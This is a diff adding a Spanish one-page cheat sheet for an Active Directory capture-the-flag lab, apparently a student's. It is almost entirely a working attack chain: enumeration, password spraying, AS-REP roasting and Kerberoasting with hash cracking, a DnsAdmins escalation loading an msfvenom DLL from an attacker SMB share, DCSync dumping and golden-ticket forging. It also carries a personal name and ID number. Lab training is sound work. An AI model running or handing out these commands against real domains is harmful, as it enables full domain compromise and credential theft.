@@ -1,0 +1,99 @@
+╔══════════════════════════════════════════════════════════════╗
+║     🏆 CTF AD - CHEATSHEET RAPIDO (1 PAGINA)              ║
+║     Itmar Castillo - 8-1027-180                           ║
+╚══════════════════════════════════════════════════════════════╝
+
+📌 DATOS DEL LABORATORIO:
+   DC       = 172.31.254.146  (DC01)
+   CLIENT   = 172.31.254.147  (CLIENT01)
+   DOMAIN   = lab.local
+   KALI     = 172.31.254.___  (la del DHCP)
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 1: RECON (50pts) - 5 min
+═══════════════════════════════════════════════════════════════
+  nmap -sVC -p 53,88,135,139,389,445,636,3268,3389,5985 $DC
+  enum4linux-ng -A $DC -oA recon/e4l
+  smbclient -L //$DC -N
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 2: USUARIOS (50pts) - 2 min
+═══════════════════════════════════════════════════════════════
+  ldapsearch -x -H ldap://$DC -b "DC=X,DC=LOCAL" \
+    "(objectClass=user)" sAMAccountName | \
+    grep sAMAccountName | awk '{print $2}' > users.txt
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 3: PASSWORD EN DESCRIPTION (100pts) - 2 min
+═══════════════════════════════════════════════════════════════
+  ldapsearch -x -H ldap://$DC -b "DC=X,DC=LOCAL" \
+    "(description=*)" sAMAccountName description | \
+    grep -B1 -i "pass\|contrase\|pwd\|123"
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 4: PASSWORD POR DEFECTO (100pts) - 3 min
+═══════════════════════════════════════════════════════════════
+  kerbrute passwordspray -d $DOM --dc $DC users.txt "Password123!"
+  kerbrute passwordspray -d $DOM --dc $DC users.txt "ChangeMe123!"
+  crackmapexec smb $DC -u users.txt -p "Password123!" \
+    --continue-on-success
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 5: AS-REP ROASTING (150pts) - 3 min
+═══════════════════════════════════════════════════════════════
+  impacket-GetNPUsers "$DOM/" -dc-ip $DC -no-pass \
+    -usersfile users.txt
+  hashcat -m 18200 hashes.txt rockyou.txt --show
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 6: KERBEROASTING (150pts) - 3 min
+═══════════════════════════════════════════════════════════════
+  impacket-GetUserSPNs "$DOM/user:pass" -dc-ip $DC -request
+  hashcat -m 13100 hashes.txt rockyou.txt --show
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 7: BLOODHOUND (250pts) - 10 min
+═══════════════════════════════════════════════════════════════
+  bloodhound-python -d $DOM -u "u" -p "p" -dc $DC -c All -ns $DC
+  sudo neo4j start && bloodhound --no-sandbox &
+  Query: "Shortest Paths to Domain Admins from Owned"
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 8: DNSADMINS a SYSTEM (250pts) - 10 min
+═══════════════════════════════════════════════════════════════
+  ldapsearch -x -H ldap://$DC -b "DC=X,DC=LOCAL" \
+    "(&(objectClass=group)(cn=DnsAdmins))" member
+  msfvenom -p windows/x64/exec CMD="..." -f dll -o evil.dll
+  sudo impacket-smbserver -smb2support share /tmp/
+  # En DC: dnscmd DC01 /config /serverlevelplugindll \\IP\share\evil.dll
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 9: DCSYNC (300pts) - 3 min
+═══════════════════════════════════════════════════════════════
+  impacket-secretsdump "$DOM/user:pass"@$DC -just-dc-user krbtgt
+  impacket-secretsdump "$DOM/user:pass"@$DC -just-dc
+  # Guardar: KRBTGT_NTLM + DOMAIN_SID
+
+═══════════════════════════════════════════════════════════════
+🔹 FASE 10: GOLDEN TICKET (400pts) - 3 min
+═══════════════════════════════════════════════════════════════
+  impacket-ticketer -nthash <KRBTGT_NTLM> \
+    -domain-sid <SID> -domain $DOM administrator
+  export KRB5CCNAME=administrator.ccache
+  impacket-smbexec "$DOM/administrator"@$DC -k -no-pass
+  impacket-secretsdump "$DOM/administrator"@$DC -k -no-pass
+
+═══════════════════════════════════════════════════════════════
+📝 MIS NOTAS / CREDENCIALES ENCONTRADAS:
+═══════════════════════════════════════════════════════════════
+  Usuario:Password
+  ───────────────────────────────────
+  ___ : ____________________________
+  ___ : ____________________________
+  ___ : ____________________________
+  ___ : ____________________________
+
+  USUARIOS AS-REP roastable: _______________
+  SPNs Kerberoast: _________________________
+  Hash krbtgt: _____________________________
+  SID Dominio: _____________________________
